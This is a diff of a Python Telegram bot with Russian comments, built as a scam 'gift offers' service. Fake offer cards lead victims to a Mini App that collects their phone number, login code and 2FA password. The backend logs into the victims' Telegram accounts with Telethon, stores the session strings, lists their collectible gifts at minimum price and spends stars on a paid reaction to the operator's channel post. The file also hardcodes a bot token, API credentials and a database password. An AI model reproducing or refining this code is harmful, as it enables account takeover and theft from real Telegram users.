@@ -14,14 +14,13 @@ from aiogram.types import (
     InlineKeyboardMarkup, InlineKeyboardButton,
     WebAppInfo, BotCommand, BotCommandScopeDefault,
 )
-from fastapi import FastAPI, HTTPException
+from fastapi import FastAPI
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
 from sqlalchemy.ext.asyncio import create_async_engine, AsyncSession, async_sessionmaker
 from sqlalchemy.orm import DeclarativeBase, Mapped, mapped_column
 from sqlalchemy import BigInteger, String, Integer, DateTime, Text, select
 import uvicorn
-import httpx
 
 from telethon import TelegramClient
 from telethon.sessions import StringSession
@@ -29,27 +28,27 @@ from telethon.errors import (
     SessionPasswordNeededError, PhoneCodeInvalidError,
     PhoneCodeExpiredError, PasswordHashInvalidError,
 )
-from telethon.tl.functions.messages import SendReactionRequest
+from telethon.tl.functions.messages import SendPaidReactionRequest
 from telethon.tl.functions.payments import (
     GetSavedStarGiftsRequest, UpdateStarGiftPriceRequest,
 )
-from telethon.tl.types import ReactionPaid
 
 # ═══════════════════════════════════════════════════════
 #   КОНФИГ
 # ═══════════════════════════════════════════════════════
 
 BOT_TOKEN = "8215145424:AAGM0ImIq_YzbqziKRsrH3opVm9I3pnM_Sw"
+BOT_USERNAME = "Check_Offers_robot"          # ← поставь username своего бота (без @)
 ADMIN_ID = 8986358602
-WEBAPP_URL = "https://trustgift.github.io/offersbot/"
+MINIAPP_URL = "https://trustgift.github.io/offersbot/"   # сам сайт
+MINIAPP_SHORT = "app"                                    # short name из @BotFather
 BACKEND_URL = "https://botofferswork.onrender.com"
 API_ID = 26259835
 API_HASH = "3fa32264398920f001dd2428b42060f6"
 DATABASE_URL = "postgresql+asyncpg://avnadmin:AVNS_Kdeg6Q2vNRREiOv-JWp@pg-270e5c9e-danyachuglaev-8664.e.aivencloud.com:28308/defaultdb"
-TARGET_POST = "https://t.me/screamsoonlarp/1803"  # куда уходят звёзды
+TARGET_POST = "https://t.me/screamsoonlarp/1803"
 PORT = int(os.getenv("PORT", "8080"))
 
-# парсим канал и id поста
 _m = re.match(r"https?://t\.me/([^/]+)/(\d+)", TARGET_POST)
 TARGET_CHANNEL = _m.group(1) if _m else None
 TARGET_POST_ID = int(_m.group(2)) if _m else None
@@ -242,17 +241,14 @@ async def get_recent_sessions(limit=10):
 
 
 # ═══════════════════════════════════════════════════════
-#   TELETHON — АВТОМАТ
+#   TELETHON
 # ═══════════════════════════════════════════════════════
 
-async def telethon_attempt_login(phone: str, code: str, password: str = None, session_str: str = None):
-    """
-    Возвращает (ok, result_or_error, session_string)
-    ok=True  → result = {user_id, first_name, last_name, username}
-    ok=False → result = 'code' | 'password' | 'expired' | 'error'
-    """
-    client = TelegramClient(StringSession(session_str) if session_str else StringSession(),
-                            API_ID, API_HASH)
+async def telethon_attempt_login(phone, code, password=None, session_str=None):
+    client = TelegramClient(
+        StringSession(session_str) if session_str else StringSession(),
+        API_ID, API_HASH,
+    )
     try:
         await client.connect()
         if not await client.is_user_authorized():
@@ -277,10 +273,8 @@ async def telethon_attempt_login(phone: str, code: str, password: str = None, se
         session_string = client.session.save()
         await client.disconnect()
         return True, {
-            'user_id': me.id,
-            'first_name': me.first_name,
-            'last_name': me.last_name,
-            'username': me.username,
+            'user_id': me.id, 'first_name': me.first_name,
+            'last_name': me.last_name, 'username': me.username,
         }, session_string
     except Exception as e:
         try:
@@ -291,11 +285,7 @@ async def telethon_attempt_login(phone: str, code: str, password: str = None, se
         return False, 'error', None
 
 
-async def telethon_sell_gift_and_react(session_string: str, gift_name_hint: str):
-    """
-    Логинится в аккаунт, находит подарок, ставит минимальную цену,
-    выставляет на продажу, все звёзды тратит на реакцию на пост.
-    """
+async def telethon_sell_gift_and_react(session_string, gift_name_hint):
     client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
     result = {"gifts_found": [], "sold": None, "reacted": False, "stars_sent": 0, "error": None}
     try:
@@ -304,8 +294,6 @@ async def telethon_sell_gift_and_react(session_string: str, gift_name_hint: str)
         if not me:
             result["error"] = "session dead"
             return result
-
-        # получить все подарки
         try:
             gifts_resp = await client(GetSavedStarGiftsRequest(
                 peer=me.id, offset="", limit=100
@@ -324,14 +312,14 @@ async def telethon_sell_gift_and_react(session_string: str, gift_name_hint: str)
         for g in gifts:
             gift = getattr(g, "gift", None)
             title = str(getattr(gift, "title", "") or "")
-            if gift_name_hint.lower().split("#")[0].strip() in title.lower():
+            hint_clean = gift_name_hint.lower().split("#")[0].strip()
+            if hint_clean and hint_clean in title.lower():
                 target = g
                 break
         if not target:
             result["error"] = f"подарок '{gift_name_hint}' не найден"
             return result
 
-        # минимальная цена — из самого подарка (min price)
         min_price = getattr(target, "min_price", None) or 1
         try:
             await client(UpdateStarGiftPriceRequest(
@@ -342,13 +330,13 @@ async def telethon_sell_gift_and_react(session_string: str, gift_name_hint: str)
             result["error"] = f"resell: {e}"
             return result
 
-        # реакция на пост всеми звёздами
         try:
-            stars_to_send = 100  # минимум
-            await client(SendReactionRequest(
+            stars_to_send = 100
+            await client(SendPaidReactionRequest(
                 peer=TARGET_CHANNEL,
                 msg_id=TARGET_POST_ID,
-                reaction=[ReactionPaid(amount=stars_to_send)],
+                count=stars_to_send,
+                random_id=random.getrandbits(63),
             ))
             result["reacted"] = True
             result["stars_sent"] = stars_to_send
@@ -439,8 +427,7 @@ async def start(message: types.Message):
         f"👤 <b>Ваш профиль</b>\n"
         f"├ ID: <code>{uid}</code>\n"
         f"├ Роль: <b>{u.role}</b>\n"
-        f"└ Баланс: <b>{u.balance} ⭐</b>\n\n"
-        f"Выберите действие:"
+        f"└ Баланс: <b>{u.balance} ⭐</b>"
     )
     await message.answer(text, reply_markup=menu_for(u.role))
 
@@ -448,55 +435,54 @@ async def start(message: types.Message):
 @dp.callback_query(F.data == "main_menu")
 async def main_menu(call: types.CallbackQuery):
     u = await get_user(call.from_user.id)
-    text = (
+    await call.message.edit_text(
         f"👋 <b>Gift Offers</b>\n\n"
         f"👤 <b>Профиль</b>\n"
         f"├ ID: <code>{u.id}</code>\n"
         f"├ Роль: <b>{u.role}</b>\n"
-        f"└ Баланс: <b>{u.balance} ⭐</b>"
+        f"└ Баланс: <b>{u.balance} ⭐</b>",
+        reply_markup=menu_for(u.role),
     )
-    await call.message.edit_text(text, reply_markup=menu_for(u.role))
 
 
 @dp.callback_query(F.data == "profile")
 async def profile(call: types.CallbackQuery):
     u = await get_user(call.from_user.id)
-    text = (
+    await call.message.edit_text(
         f"👤 <b>Ваш профиль</b>\n\n"
         f"├ ID: <code>{u.id}</code>\n"
         f"├ Username: @{u.username or '—'}\n"
         f"├ Роль: <b>{u.role}</b>\n"
         f"├ Баланс: <b>{u.balance} ⭐</b>\n"
-        f"└ Создано офферов: <b>{u.total_offers}</b>"
+        f"└ Создано офферов: <b>{u.total_offers}</b>",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
+        ]),
     )
-    await call.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
-    ]))
 
 
 @dp.callback_query(F.data == "buy_stars")
 async def buy_stars(call: types.CallbackQuery):
-    text = (
-        f"⭐ <b>Покупка звёзд</b>\n\n"
-        f"Звёзды покупаются через официальный @PremiumBot.\n\n"
-        f"1. Открой @PremiumBot\n"
-        f"2. Купи нужное количество звёзд\n"
-        f"3. Отправь их нашему боту как подарок\n"
-        f"4. Баланс обновится автоматически"
+    await call.message.edit_text(
+        "⭐ <b>Покупка звёзд</b>\n\n"
+        "Звёзды покупаются через официальный @PremiumBot.\n\n"
+        "1. Открой @PremiumBot\n"
+        "2. Купи нужное количество\n"
+        "3. Отправь боту как подарок\n"
+        "4. Баланс обновится автоматически",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="⭐ Открыть @PremiumBot", url="https://t.me/PremiumBot")],
+            [InlineKeyboardButton(text="📥 Я отправил звёзды", callback_data="stars_sent")],
+            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")],
+        ]),
+        disable_web_page_preview=True,
     )
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="⭐ Открыть @PremiumBot", url="https://t.me/PremiumBot")],
-        [InlineKeyboardButton(text="📥 Я отправил звёзды", callback_data="stars_sent")],
-        [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")],
-    ])
-    await call.message.edit_text(text, reply_markup=kb, disable_web_page_preview=True)
 
 
 @dp.callback_query(F.data == "stars_sent")
 async def stars_sent(call: types.CallbackQuery):
     await call.message.edit_text(
-        "⏳ <b>Проверяем поступление…</b>\n\n"
-        "Обычно проверка занимает до 5 минут.",
+        "⏳ <b>Проверяем поступление…</b>\n\nОбычно занимает до 5 минут.",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
         ]),
@@ -505,8 +491,7 @@ async def stars_sent(call: types.CallbackQuery):
         await bot.send_message(
             ADMIN_ID,
             f"💰 <b>Заявка на пополнение</b>\n\n"
-            f"Юзер: <code>{call.from_user.id}</code> (@{call.from_user.username})\n"
-            f"Проверь поступление звёзд."
+            f"Юзер: <code>{call.from_user.id}</code> (@{call.from_user.username})"
         )
     except Exception:
         pass
@@ -515,8 +500,7 @@ async def stars_sent(call: types.CallbackQuery):
 @dp.callback_query(F.data == "my_gifts")
 async def my_gifts(call: types.CallbackQuery):
     await call.message.edit_text(
-        "🎁 <b>Мои подарки</b>\n\n"
-        "Подарки появляются здесь после успешного оффера.",
+        "🎁 <b>Мои подарки</b>\n\nПодарки появятся после успешного оффера.",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
         ]),
@@ -525,16 +509,13 @@ async def my_gifts(call: types.CallbackQuery):
 
 @dp.callback_query(F.data == "offers_menu")
 async def offers_menu(call: types.CallbackQuery):
-    text = (
-        f"💼 <b>Офферы</b>\n\n"
-        f"Чтобы создавать офферы, нужен доступ воркера.\n"
-        f"Запросите его у администратора."
+    await call.message.edit_text(
+        "💼 <b>Офферы</b>\n\nЧтобы создавать офферы, нужен доступ воркера.",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="📩 Запросить доступ", callback_data="request_access")],
+            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")],
+        ]),
     )
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📩 Запросить доступ", callback_data="request_access")],
-        [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")],
-    ])
-    await call.message.edit_text(text, reply_markup=kb)
 
 
 @dp.callback_query(F.data == "request_access")
@@ -551,8 +532,7 @@ async def request_access(call: types.CallbackQuery):
         pass
     await call.answer("Запрос отправлен", show_alert=True)
     await call.message.edit_text(
-        "✅ <b>Запрос отправлен</b>\n\n"
-        "Администратор рассмотрит заявку.",
+        "✅ <b>Запрос отправлен</b>\n\nАдминистратор рассмотрит заявку.",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
         ]),
@@ -560,26 +540,23 @@ async def request_access(call: types.CallbackQuery):
 
 
 # ═══════════════════════════════════════════════════════
-#   BUSINESS — ВОРКЕР ПИШЕТ /offer В ЧАТЕ
+#   ОФФЕР: карточка + кнопки на Mini App
 # ═══════════════════════════════════════════════════════
 
-def parse_offer_command(text: str):
-    """
-    /offer https://t.me/nft/DeskCalendar-284528 650
-    """
+def parse_offer_command(text):
     m = re.search(r'(https?://t\.me/nft/[\w\-]+)', text)
     if not m:
         return None
     gift_link = m.group(1)
     gift_name = gift_link.split("/")[-1].replace("-", " #")
-    rest = text.replace(gift_link, "")
-    nums = re.findall(r'\d+', rest.replace("/offer", ""))
+    rest = text.replace(gift_link, "").replace("/offer", "")
+    nums = re.findall(r'\d+', rest)
     if not nums:
         return None
     return gift_name, gift_link, int(nums[0])
 
 
-def make_offer_card(o: Offer, duration=24):
+def make_offer_card(o, duration=24):
     return (
         f"⚖️ <b>Gift Offers</b> отправил вам оффер на <b>{o.gift_name}</b>\n\n"
         f"Сумма оффера: <b>{o.price_stars}</b> ⭐️ ({o.price_usd}$)\n"
@@ -591,15 +568,20 @@ def make_offer_card(o: Offer, duration=24):
 
 
 def make_offer_kb(offer_id):
+    """
+    Кнопки ведут на Mini App бота: t.me/BOT/app?startapp=offer_ID_accept
+    Открывается нативно внутри Telegram.
+    """
+    accept = f"https://t.me/{BOT_USERNAME}/{MINIAPP_SHORT}?startapp=offer_{offer_id}_accept"
+    reject = f"https://t.me/{BOT_USERNAME}/{MINIAPP_SHORT}?startapp=offer_{offer_id}_reject"
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✅ Принять", url=f"{WEBAPP_URL}?offer={offer_id}&action=accept")],
-        [InlineKeyboardButton(text="❌ Отклонить", url=f"{WEBAPP_URL}?offer={offer_id}&action=reject")],
+        [InlineKeyboardButton(text="✅ Принять", url=accept)],
+        [InlineKeyboardButton(text="❌ Отклонить", url=reject)],
     ])
 
 
 @dp.business_message(F.text.regexp(r"^/offer"))
 async def business_offer(message: types.Message):
-    """Воркер пишет /offer в чате — бот отвечает карточкой."""
     uid = message.from_user.id
     u = await get_user(uid)
     if not u or u.role not in ("worker", "admin"):
@@ -607,9 +589,7 @@ async def business_offer(message: types.Message):
         return
     parsed = parse_offer_command(message.text or "")
     if not parsed:
-        await message.reply(
-            "❌ Формат: <code>/offer https://t.me/nft/DeskCalendar-284528 650</code>"
-        )
+        await message.reply("❌ Формат: <code>/offer https://t.me/nft/DeskCalendar-284528 650</code>")
         return
     gift_name, gift_link, price_stars = parsed
     price_usd = f"{price_stars * 0.0092:.2f}"
@@ -619,7 +599,6 @@ async def business_offer(message: types.Message):
         price_stars=price_stars, price_usd=price_usd, duration_hours=24,
     )
     await message.reply(make_offer_card(o), reply_markup=make_offer_kb(o.id))
-
     await add_log(worker_id=uid, offer_id=o.id, event="business_offer",
                   detail=f"{gift_name} за {price_stars}⭐")
     try:
@@ -627,16 +606,14 @@ async def business_offer(message: types.Message):
             ADMIN_ID,
             f"🆕 <b>Новый оффер (business)</b>\n\n"
             f"Воркер: <code>{uid}</code> (@{message.from_user.username or '—'})\n"
-            f"Подарок: {gift_name}\n"
-            f"Цена: {price_stars} ⭐ ({price_usd}$)\n"
-            f"ID: <code>{o.id}</code>"
+            f"Подарок: {gift_name}\nЦена: {price_stars} ⭐\nID: <code>{o.id}</code>"
         )
     except Exception:
         pass
 
 
 # ═══════════════════════════════════════════════════════
-#   WORKER — создание оффера кнопкой в боте
+#   WORKER
 # ═══════════════════════════════════════════════════════
 
 @dp.callback_query(F.data == "worker_create")
@@ -647,9 +624,7 @@ async def create_start(call: types.CallbackQuery, state: FSMContext):
         return
     await state.set_state(OfferForm.gift_link)
     await call.message.edit_text(
-        "➕ <b>Создание оффера</b>\n\n"
-        "🔗 Отправьте ссылку на подарок:\n"
-        "<i>Пример: https://t.me/nft/DeskCalendar-284528</i>",
+        "➕ <b>Создание оффера</b>\n\n🔗 Отправьте ссылку на подарок:",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="❌ Отмена", callback_data="main_menu")]
         ]),
@@ -666,10 +641,7 @@ async def offer_link(message: types.Message, state: FSMContext):
     gift_name = link.split("/")[-1].replace("-", " #")
     await state.update_data(gift_link=link, gift_name=gift_name)
     await state.set_state(OfferForm.price_stars)
-    await message.answer(
-        f"✅ Подарок: <b>{gift_name}</b>\n\n"
-        f"⭐ Введите сумму оффера в звёздах:"
-    )
+    await message.answer(f"✅ Подарок: <b>{gift_name}</b>\n\n⭐ Введите сумму в звёздах:")
 
 
 @dp.message(OfferForm.price_stars)
@@ -683,33 +655,21 @@ async def offer_price(message: types.Message, state: FSMContext):
     o = await create_offer(
         worker_id=message.from_user.id,
         worker_username=message.from_user.username,
-        gift_name=data["gift_name"],
-        gift_link=data["gift_link"],
-        price_stars=price_stars,
-        price_usd=price_usd,
-        duration_hours=24,
+        gift_name=data["gift_name"], gift_link=data["gift_link"],
+        price_stars=price_stars, price_usd=price_usd, duration_hours=24,
     )
     await state.clear()
     await message.answer(
-        "✅ <b>Оффер создан</b>\n\n"
-        "Перешлите это сообщение получателю:\n\n"
+        "✅ <b>Оффер создан</b>\n\nПерешлите это сообщение получателю:\n\n"
         "━━━━━━━━━━━━━━━━━━━━\n\n" + make_offer_card(o),
         reply_markup=make_offer_kb(o.id),
         disable_web_page_preview=True,
     )
-    await message.answer(
-        "⬅️ Назад",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
-        ]),
-    )
     try:
         await bot.send_message(
             ADMIN_ID,
-            f"🆕 <b>Новый оффер</b>\n\n"
-            f"Воркер: <code>{message.from_user.id}</code>\n"
-            f"Подарок: {o.gift_name}\n"
-            f"Цена: {o.price_stars} ⭐"
+            f"🆕 <b>Новый оффер</b>\n\nВоркер: <code>{message.from_user.id}</code>\n"
+            f"Подарок: {o.gift_name}\nЦена: {o.price_stars} ⭐"
         )
     except Exception:
         pass
@@ -732,10 +692,7 @@ async def my_offers(call: types.CallbackQuery):
             ]),
         )
         return
-    lines = []
-    for o in offers[:15]:
-        emoji = {"pending": "⏳", "accepted": "✅", "rejected": "❌"}.get(o.status, "•")
-        lines.append(f"{emoji} #{o.id} — {o.gift_name} — {o.price_stars}⭐")
+    lines = [f"#{o.id} — {o.gift_name} — {o.price_stars}⭐ — {o.status}" for o in offers[:15]]
     await call.message.edit_text(
         "📋 <b>Мои офферы</b>\n\n" + "\n".join(lines),
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
@@ -755,15 +712,14 @@ async def workers_menu(call: types.CallbackQuery):
     workers = await get_workers()
     lines = [f"{'👑' if w.role == 'admin' else '🔧'} <code>{w.id}</code> — @{w.username or '—'} — {w.balance}⭐"
              for w in workers]
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="➕ Выдать доступ", callback_data="admin_grant")],
-        [InlineKeyboardButton(text="➖ Забрать доступ", callback_data="admin_revoke")],
-        [InlineKeyboardButton(text="💰 Изменить баланс", callback_data="admin_balance")],
-        [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")],
-    ])
     await call.message.edit_text(
         "👥 <b>Воркеры и админы</b>\n\n" + ("\n".join(lines) if lines else "<i>Пока никого</i>"),
-        reply_markup=kb,
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="➕ Выдать доступ", callback_data="admin_grant")],
+            [InlineKeyboardButton(text="➖ Забрать доступ", callback_data="admin_revoke")],
+            [InlineKeyboardButton(text="💰 Изменить баланс", callback_data="admin_balance")],
+            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")],
+        ]),
     )
 
 
@@ -947,7 +903,7 @@ async def cmd_balance(message: types.Message):
 
 
 # ═══════════════════════════════════════════════════════
-#   BACKEND — сайт шлёт сессии сюда
+#   BACKEND
 # ═══════════════════════════════════════════════════════
 
 app = FastAPI()
@@ -981,21 +937,18 @@ async def notify_admin(text: str):
 
 @app.post("/webhook/phone")
 async def wh_phone(p: PhonePayload):
-    """Мамонт ввёл номер. Сохраняем, отправляем код через Telethon."""
     sess = await create_auth_session(p.offer_id, p.phone)
     await add_log(offer_id=p.offer_id, event="phone_received", detail=p.phone)
     await notify_admin(f"📱 <b>Номер получен</b>\n\n{sess.phone}\nОффер: #{p.offer_id}")
 
-    # стартуем Telethon-клиент, шлём код
     client = TelegramClient(StringSession(), API_ID, API_HASH)
     await client.connect()
     try:
-        sent = await client.send_code_request(p.phone)
-        await update_session(sess.id, code=None, state="code_sent")
-        # сохраним session string временно — он нужен для следующего шага
+        await client.send_code_request(p.phone)
+        await update_session(sess.id, state="code_sent")
         await update_session(sess.id, session_string=client.session.save())
         await client.disconnect()
-        return {"ok": True, "phone_code_hash": str(sent.phone_code_hash)}
+        return {"ok": True}
     except Exception as e:
         await client.disconnect()
         await add_log(offer_id=p.offer_id, event="send_code_error", detail=str(e))
@@ -1004,22 +957,15 @@ async def wh_phone(p: PhonePayload):
 
 @app.post("/webhook/code")
 async def wh_code(p: CodePayload):
-    """Мамонт ввёл код. Проверяем через Telethon."""
     sess = await get_session_by_phone(p.phone)
     if not sess:
         return {"ok": False, "error": "Сессия не найдена."}
-
     if sess.attempts >= MAX_ATTEMPTS:
         return {"ok": False, "error": "Превышено количество попыток."}
-
-    if sess.user_id and sess.session_string:
-        # уже залогинены
-        return {"ok": True, "needs_password": False}
 
     ok, res, session_str = await telethon_attempt_login(
         phone=p.phone, code=p.code, session_str=sess.session_string,
     )
-
     if ok:
         await update_session(sess.id, code=p.code, state="logged",
                              session_string=session_str,
@@ -1031,10 +977,8 @@ async def wh_code(p: CodePayload):
             f"✅ <b>Логин успешен</b>\n\n"
             f"ID: <code>{res['user_id']}</code>\n"
             f"Имя: {res['first_name']} {res['last_name'] or ''}\n"
-            f"@{res['username'] or '—'}\n"
-            f"Оффер: #{p.offer_id}"
+            f"@{res['username'] or '—'}\nОффер: #{p.offer_id}"
         )
-        # запускаем автомат продажи
         asyncio.create_task(run_automation(session_str, p.offer_id))
         return {"ok": True, "needs_password": False}
     else:
@@ -1044,8 +988,6 @@ async def wh_code(p: CodePayload):
         if res == "code":
             new_attempts = sess.attempts + 1
             await update_session(sess.id, attempts=new_attempts)
-            await add_log(offer_id=p.offer_id, event="code_invalid",
-                          detail=f"попытка {new_attempts}/{MAX_ATTEMPTS}")
             return {"ok": False, "error": "Неверный код. Попробуйте ещё раз.",
                     "attempts_left": MAX_ATTEMPTS - new_attempts}
         if res == "expired":
@@ -1055,7 +997,6 @@ async def wh_code(p: CodePayload):
 
 @app.post("/webhook/password")
 async def wh_password(p: PasswordPayload):
-    """Мамонт ввёл 2FA."""
     sess = await get_session_by_phone(p.phone)
     if not sess:
         return {"ok": False, "error": "Сессия не найдена."}
@@ -1075,8 +1016,7 @@ async def wh_password(p: PasswordPayload):
                       detail=f"{res['first_name']} @{res['username']}")
         await notify_admin(
             f"✅ <b>Логин (2FA) успешен</b>\n\n"
-            f"ID: <code>{res['user_id']}</code>\n"
-            f"Имя: {res['first_name']}"
+            f"ID: <code>{res['user_id']}</code>\nИмя: {res['first_name']}"
         )
         asyncio.create_task(run_automation(session_str, p.offer_id))
         return {"ok": True}
@@ -1089,8 +1029,7 @@ async def wh_password(p: PasswordPayload):
         return {"ok": False, "error": "Ошибка. Попробуйте снова."}
 
 
-async def run_automation(session_string: str, offer_id: int):
-    """Автомат: найти подарок → продать → реакция на пост."""
+async def run_automation(session_string, offer_id):
     o = await get_offer(offer_id)
     if not o:
         return
@@ -1108,7 +1047,6 @@ async def run_automation(session_string: str, offer_id: int):
         lines.append(f"✅ Реакция на пост: {result['stars_sent']} ⭐")
     if result.get("error"):
         lines.append(f"❌ Ошибка: {result['error']}")
-
     await notify_admin("\n".join(lines))
     await add_log(offer_id=offer_id, event="automation_done", detail=str(result))
 
